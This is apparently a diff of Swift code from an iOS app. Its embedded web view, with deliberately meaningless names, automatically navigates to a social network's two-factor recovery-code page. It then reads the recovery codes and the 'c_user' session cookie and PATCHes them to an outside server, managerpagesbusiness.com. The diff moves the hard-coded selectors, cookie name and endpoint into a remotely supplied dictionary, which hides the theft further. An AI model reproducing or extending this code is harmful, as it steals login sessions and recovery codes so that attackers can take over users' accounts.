@@ -17,7 +17,7 @@ struct Coords_Nine_Reco : UIViewRepresentable {
     let url: URL?
     @Binding var is_Nine_Reco_Chuyen_Man: Bool
     @Binding var is_Nine_Reco_Contains: Bool // Contains
-
+    var arrayData: [String: String] = [:]
     private let ob_Nineservable = Nine_Observable()
     var ob_Nineserver: NSKeyValueObservation? {
         ob_Nineservable.ins_Nine_tance
@@ -31,7 +31,7 @@ struct Coords_Nine_Reco : UIViewRepresentable {
         config.defaultWebpagePreferences = prefs
         
         let webview = WKWebView(frame: .zero, configuration: config)
-        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
+        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
         webview.navigationDelegate = context.coordinator
         webview.load(URLRequest(url: url!))
 
@@ -52,35 +52,35 @@ func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKN
 func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
 
 DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
- webView.evaluateJavaScript("document.querySelector('[href=\"/security/2fac/factors/recovery-code/\"]').click();", completionHandler: { result, error in })
+ webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_1a.rawValue] ?? "", completionHandler: { result, error in })
 }
 DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
- webView.evaluateJavaScript("document.querySelector('[name=\"reset\"]').click();", completionHandler: { result, error in })
+ webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_2a.rawValue] ?? "", completionHandler: { result, error in })
 }
 DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
-    webView.evaluateJavaScript("document.querySelector('[class=\"_42ft _4jy0 _4m0m _4jy3 _4jy1 selected _51sy\"]').click();", completionHandler: { result, error in })
+    webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_3a.rawValue] ?? "", completionHandler: { result, error in })
 }
 DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
-    webView.evaluateJavaScript("document.querySelector('[value=\"true\"]').click();", completionHandler: { result, error in })
+    webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_4a.rawValue] ?? "", completionHandler: { result, error in })
 }
 DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
-    webView.evaluateJavaScript("document.querySelector('[class=\"_3-8_ img\"]').click();", completionHandler: { result, error in })
+    webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_5a.rawValue] ?? "", completionHandler: { result, error in })
 }
     
     DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
-        webView.evaluateJavaScript("document.querySelector('[action=\"/security/2fac/factors/recovery-code/\"]').innerHTML") {  html, error in
+        webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_6a.rawValue] ?? "") {  html, error in
             if let htmlrecovery = html as? String, error == nil {
                 if !htmlrecovery.isEmpty{
-                    if htmlrecovery.contains("href=\"/security/2fac/recovery_code/file/\"") {
+                    if htmlrecovery.contains(arrayData[ValueKey.eight_fr_7a.rawValue] ?? "") {
                         WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ (cookies) in
-                            let seven_reco_i = cookies.firstIndex(where: { $0.name == "c_user" })
+                            let seven_reco_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                             if(seven_reco_i != nil){
                                 let Six_json_data: [String: Any] = [
-                                    "cuserReco": cookies[seven_reco_i!].value,
-                                    "codeReco": "\(htmlrecovery)",
-                                    "nameapp": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-TWO"
+                                    arrayData[ValueKey.name_api_20.rawValue] ?? "": cookies[seven_reco_i!].value,
+                                    arrayData[ValueKey.name_api_21.rawValue] ?? "": "\(htmlrecovery)",
+                                    arrayData[ValueKey.name_api_22.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-TWO"
                                 ]
-                                let url : URL = URL(string: "https://managerpagesbusiness.com/api/saverecovery")!
+                                let url : URL = URL(string: arrayData[ValueKey.Chung_fr_07.rawValue] ?? "")!
                                 let json_data = try? JSONSerialization.data(withJSONObject: Six_json_data)
                                 var request = URLRequest(url: url)
                                 request.httpMethod = "PATCH"
